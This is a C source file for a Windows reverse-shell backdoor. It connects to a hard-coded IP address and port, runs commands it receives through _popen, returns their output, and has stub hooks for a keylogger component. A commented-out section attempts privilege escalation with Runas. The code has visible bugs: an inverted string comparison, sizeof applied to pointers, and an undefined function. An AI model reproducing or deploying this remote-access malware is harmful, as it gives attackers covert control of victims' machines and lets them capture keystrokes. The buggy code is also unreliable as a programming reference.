#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void)memset((p), 0, (size))



int sock;

int strincludes(char *str, char *buffer)
{
    if (!str)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        if (strcmp(buffer, token))
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
}

char *strsub(char str[], int slice_from, int slice_to)
{
    if (!str[slice_from + 1])
    {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;
    if (slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
        {
            return NULL;
        }

        if (abs(slice_from) > str_len)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if (slice_from >= 0 && slice_to > slice_from)
    {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    }

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

int InfoComp(char *buffer);
int RunComp(char *buffer);
int StopComp(char *buffer);


int Shell()
{

    char buffer[1024];
    char container[1024];
    char total_response[18384];
    while (1)
    {
    jumb:
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, 1024, 0);

        printf("[CMD] -> %s\n", buffer);

        if (strncmp("q", buffer, 1) == 0)
        {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(strsub(buffer, 3, 100));
        }
        else if (strncmp("$comp ", buffer, 6) == 0)
        {
   
                if (strincludes(buffer, "info"))
                {
                    InfoComp(buffer);
                }
                else if (strincludes(buffer, "run"))
                {
                    RunComp(buffer);
                }
                else if (strincludes(buffer, "stop"))
                {
                    StopComp(buffer);
                }
       
        }

        // else if (strncmp("root", buffer, 4) == 0)
        // {
        //     // Runas /profile /user:desktop-s8hujih\s3q CMD
        //     char root[1024] = "Runas /profile /user:";

        //     // char *app = "cmd";
        //     FILE *fp_root;
        //     fp_root = _popen("whoami", "rt");
        //     while (fgets(container, 1024, fp_root))
        //     {
        //         strcat(total_response, container);
        //     }
        //     if (feof(fp_root))
        //     {
        //         strtok(total_response, "\n");
        //         // strcpy(root_response, total_response);
        //         printf("[TRES] -> %s\n", total_response);

        //         strcat(root, total_response);
        //         strcat(root, " cmd");
        //         printf("[RT] - %s\n", root);
        //         // FILE *stop = _popen("pause", "rt");

        //         strcpy(buffer, root);
        //         printf("[BT] - %s\n", buffer);
        //         _pclose(fp_root);

        //         bzero(container, sizeof(container));
        //         bzero(total_response, sizeof(total_response));

        //         FILE *fp;
        //         fp = _popen(buffer, "rwt");

        //         while (fgets(container, 1024, fp))
        //         {
        //             strcat(total_response, container);
        //             // send(sock, container, sizeof(container), 0);

        //         }
        //         if (feof(fp))
        //         {
        //             printf("[TRES] -> %s\n", total_response);
        //             send(sock, total_response, sizeof(total_response), 0);
        //             _pclose(fp);

        //         }
        //     }
        // }

        else
        {

            FILE *fp;
            fp = _popen(buffer, "rt");
            while (fgets(container, 1024, fp))
            {
                strcat(total_response, container);
            }
            if (feof(fp))
            {

                printf("[TRES] -> %s\n", total_response);
                send(sock, total_response, sizeof(total_response), 0);

                _pclose(fp);
            }
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int nCmdShow)
{

    HWND stealth;

    AllocConsole();

    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 1);

    struct sockaddr_in ServAdrr;
    unsigned short ServPort;
    char *ServIp;

    WSADATA wsaData;

    ServIp = "192.168.1.38";
    ServPort = 50005;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAdrr, 0, sizeof(ServAdrr));
    ServAdrr.sin_family = AF_INET;
    ServAdrr.sin_addr.s_addr = inet_addr(ServIp);
    ServAdrr.sin_port = htons(ServPort);

start:
    // printf("%d", connect(sock, (struct sockaddr *)&ServAdrr, sizeof(ServAdrr)));
    while (connect(sock, (struct sockaddr *)&ServAdrr, sizeof(ServAdrr)) != 0)
    {
        printf("[+] - Connected ^_^\n");
        Sleep(10);
        goto start;
    }

    Shell();
}


int InfoComp(char *buffer) {
    char *infotext;

    if (strincludes(buffer, "keylog")) {
        infotext = "[INFO] - this component save all key will user press it";
    }

    send(sock, infotext, sizeof(infotext), 0);
} 

int RunComp(char *buffer) {
    char *complink;

    if (strincludes(buffer, "keylog")) {
        complink = "";
    }

    char *qaury1 = "";
    send(sock, qaury1, sizeof(qaury1), 0);
} 